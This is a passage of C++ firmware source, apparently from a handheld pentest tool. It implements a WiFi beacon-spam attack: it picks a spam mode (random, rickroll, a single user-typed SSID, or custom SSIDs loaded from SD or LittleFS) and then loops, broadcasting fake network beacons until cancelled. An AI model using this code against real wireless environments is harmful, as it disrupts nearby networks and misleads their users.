             txt = "Spamming Random";
         }                        },
        {"Single SSID",
         [&]() {
             BeaconMode = 4;
             txt = "Spamming Single";
         }                        },
        {"Custom SSIDs", [&]() {
             BeaconMode = 3;
             txt = "Spamming Custom";
         }},
    };
    addOptionToMainMenu();
    loopOptions(options);

    wifiConnected = true; // display wifi icon
    String beaconFile = "";
    File file;
    FS *fs;

    // Get user input for single SSID mode
    if (BeaconMode == 4) {
        singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
        if (singleSSID.length() == 0) {
            return; // User cancelled
        }
    }

    if (BeaconMode != 3) {
        drawMainBorderWithTitle("WiFi: Beacon SPAM");
        displayTextLine(txt);
    }

    while (1) {
        if (BeaconMode == 0) {
            beaconSpamList(Beacons);
        } else if (BeaconMode == 1) {
            beaconSpamList(rickrollssids);
        } else if (BeaconMode == 2) {
            char *randoms = randomSSID();
            beaconSpamList(randoms);
        } else if (BeaconMode == 4) {
            beaconSpamSingle(singleSSID);
        } else if (BeaconMode == 3) {
            if (!file) {
                options = {};

                fs = nullptr;
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                addOptionToMainMenu();

                loopOptions(options);
                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
                else return;
                file = fs->open(beaconFile, FILE_READ);
                beaconFile = file.readString();
                beaconFile.replace("\r\n", "\n");
                tft.drawPixel(0, 0, 0);
                drawMainBorderWithTitle("WiFi: Beacon SPAM");
                displayTextLine(txt);
            }

            const char *randoms = beaconFile.c_str();
            beaconSpamList(randoms);
        }
        if (check(EscPress) || returnToMenu) {
            if (BeaconMode == 3) file.close();
            break;
        }
    }
    wifi_atk_unsetWifi();
}
